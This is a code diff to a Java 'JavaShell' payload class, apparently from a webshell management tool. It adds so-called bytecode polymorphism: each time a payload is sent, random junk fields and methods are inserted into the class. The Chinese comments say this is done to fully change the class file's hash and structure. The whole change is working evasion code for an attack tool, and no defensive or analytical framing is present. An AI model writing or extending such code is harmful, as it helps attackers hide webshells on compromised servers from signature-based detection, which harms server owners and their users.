@@ -68,18 +68,40 @@ public class JavaShell implements Payload {
       return className;
    }
 
-   public byte[] dynamicUpdateClassName(String protoName, byte[] classContent) {
+  public byte[] dynamicUpdateClassName(String protoName, byte[] classContent) {
       try {
+         // 1. 加载类
          CtClass ctClass = ClassPool.getDefault().makeClass((InputStream)(new ByteArrayInputStream(classContent)));
+         
+         // 2. 随机化类名 (原有逻辑)
          String className = this.randomName();
          ctClass.setName(className);
+         
+         // =================== [新增：字节码多态化] ===================
+         // 这里的逻辑会在每次发送 payload 时，向类中插入随机的垃圾字段和方法
+         // 从而彻底改变 class 文件的哈希值和结构
+         
+         // 3. 动态添加随机成员变量
+         String randomFieldName = "f_" + functions.md5(UUID.randomUUID().toString()).substring(0, 6);
+         String randomValue = UUID.randomUUID().toString();
+         CtField field = CtField.make("public String " + randomFieldName + " = \"" + randomValue + "\";", ctClass);
+         ctClass.addField(field);
+         
+         // 4. 动态添加随机方法
+         String randomMethodName = "m_" + functions.md5(UUID.randomUUID().toString()).substring(0, 6);
+         String methodBody = "public void " + randomMethodName + "() { String junk = \"" + UUID.randomUUID().toString() + "\"; }";
+         CtMethod method = CtNewMethod.make(methodBody, ctClass);
+         ctClass.addMethod(method);
+         // ==========================================================
+
          this.dynamicClassNameHashMap.put(protoName, className);
-         Log.log("%s ----->>>>> %s", protoName, className);
+         Log.log("%s ----->>>>> %s (Polymorphism Applied)", protoName, className);
+         
          classContent = ctClass.toBytecode();
          ctClass.detach();
          return classContent;
       } catch (Exception var5) {
-         Log.error((Throwable)var5);
+         Log.error(var5);
          this.dynamicClassNameHashMap.put(protoName, protoName);
          return classContent;
       }
